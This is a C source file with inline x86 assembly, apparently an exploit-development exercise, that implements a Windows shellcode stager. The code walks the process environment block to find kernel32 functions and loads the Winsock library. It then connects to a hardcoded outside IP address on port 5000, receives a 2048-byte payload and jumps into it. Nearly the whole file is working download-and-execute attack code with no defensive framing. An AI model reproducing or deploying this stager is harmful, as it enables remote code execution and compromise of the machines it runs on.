#include <stdio.h>
#include <windows.h>
void shellcode()
{
	long p = 0;
	__asm{
		jmp start
find_function:
		push ebp
		mov ebp,esp

		mov eax,fs:[0x30]				//fs points to teb in user mode，get pointer to peb
		mov eax,[eax+0x0c]				//get peb->ldr
		mov eax,[eax+0x14]				//get peb->ldr.InMemoryOrderModuleList.Flink(1st entry)
module_loop:
		mov eax,[eax]				    //skip the first entry or get the next entry
		mov esi,[eax+0x28]				//get the BaseDllName->Buffer
		cmp byte ptr [esi+0x0c],'3'		//test the module's seventh's wchar is '3' or not，kernel32.dll
		jne module_loop

		//====================================
		//find kernel32.dll module
		//====================================
		mov eax,[eax+0x10]				//LDR_DATA_TABLE_ENTRY->DllBase

		//====================================
		//kernel32.dll PE Header
		//====================================
		mov edi,eax
		add edi,[edi+0x3c]				//IMAGE_DOS_HEADER->e_lfanew

		//====================================
		//kernel32.dll export directory table
		//====================================
		mov edi,[edi+0x78]				//IMAGE_NT_HEADERS->OptinalHeader.DataDirectory[EAT].VirtualAddress
		add edi,eax

		mov ebx,edi    // ebx is EAT's virtual address,we’ll use it later

		//====================================
		//kernel32.dll Name Pointer Table
		//====================================
		mov edi,[ebx+0x20]				//IMAGE_EXPORT_DESCRIPTOR->AddressOfNames RVA
		add edi,eax

		xor ecx,ecx						//NameOrdinals

name_loop:
		mov esi,[edi+ecx*4]
		add esi,eax
		inc ecx
		mov edx,[esp+8]				    //first parameter
		cmp dword ptr [esi],edx
		jne name_loop
		mov edx,[esp+0xc]				//second parameter
		cmp dword ptr [esi+4],edx
		jne name_loop

		//======================================
		//kernel32.dll Ordinal Table
		//======================================
		mov edi,[ebx+0x24]
		add edi,eax
		mov ecx,[edi+ecx*2]
		and ecx,0xFFFF				   //cause ordinal is USHORT of size,so we just use its lower 16-bits

		//======================================
		//kernel32.dll Address Table
		//======================================
		mov edi,[ebx+0x1c]
		add edi,eax
		dec ecx    //subtract ordinal base
		sal ecx,2
		mov edi,[edi+ecx]
		add eax,edi

		pop ebp
		ret 8

start:
		//====================================
		// Get GetProcAddress's address
		//====================================
		push 0x41636f72    //rocA
		push 0x50746547    //Getp
		call find_function

		push eax						//store GetProcAddress in stack

		//====================================
		//Get LoadLibraryA's address
		//====================================
		push 0x7262694c    //Libr
		push 0x64616f4c    //Load
		call find_function

		push eax						//store LoadLibraryA in stack
		//====================================
		//TODO:
		//====================================
		push 0x6C6C ;ws2_32.dll
		push 0x642E3233
		push 0x5F327377
		push esp
		call [esp+16];					//LoadLibraryA
		add esp,0xc
		mov ebx,eax						//ebx is instance of ws2_32
		
	
		push 0x7075
		push 0x74726174
		push 0x53415357
		push esp
		push ebx
		call [esp+24]
		add esp,0xC
		push eax						//store WSAStartup
		
		
		push 0x4174
		push 0x656B636F
		push 0x53415357
		push esp
		push ebx
		call [esp+28]
		add esp,0xC
		push eax						//store WSASocket
		
		push 0x7463 ;WSAConnect
		push 0x656E6E6F
		push 0x43415357
		push esp
		push ebx
		call [esp+32]
		add esp,0xC
		push eax						//store WSAConnect
		
		push 0x766365 ;WSARecv
		push 0x52415357
		push esp
		push ebx
		call [esp+32]
		add esp,0x8
		push eax						//store WSARecv
		
		sub esp,400
		push esp
		push 0x0202
		call [esp+420]					//call WSAStartup
		add esp,400


		push 1
		push 0
		push 0
		push 6
		push 1
		push 2
		call [esp + 32]					//call WSASocket
		push eax //1 -> sockfd

		
		
		push 0							//SOCKADDR_IN structure,total 16 bytes
		push 0
		push 0x2435B876					//IP address :118.184.53.36,network bytes
		push 0x88130002					// family <- AF_INET,Port <- 5000
		xor eax,eax
		push eax
		push eax
		push eax
		push eax
		push 16
		lea eax,[esp+20] ;eax -> sockaddr
		push eax
		mov eax,[esp + 40] ;eax = sockfd
		push eax
		call [esp + 52]					//call WSAConnect
		add esp,16
		mov p,eax
		
		//if(0 != WSARecv(sock,&buf,1,&dwLen,&dwFlag,NULL,NULL))
		sub esp,2048 //[_WSABUF -> buf]
		push esp //_WSABUF -> buf
		push 2048 //_WSABUF -> len
		push 0							//Flags
		push 0							//dwLen
		push 0
		push 0
		lea eax,[esp+12]				//eax -> dwFlag
		push eax
		lea eax,[esp+12]				//eax -> dwLen
		push eax
		push 1
		lea eax,[esp+28]				//pointer of _WSABUF 
		push eax
		mov eax,[esp+2088]				//eax -> socket fd
		push eax
		call [esp+2096]					//call WSARecv
		add esp,16

		cmp eax,0
		jnz failed
		call esp
failed:
		add esp,2048

		add esp,28						//balance stack
		//====================================
						       //cause we push GetProcAddress and LoadLibrary in stack
	}

	printf("p = %p,LastError = %d\n",p,GetLastError());
}

int main()
{
	shellcode();
	return 0;
}
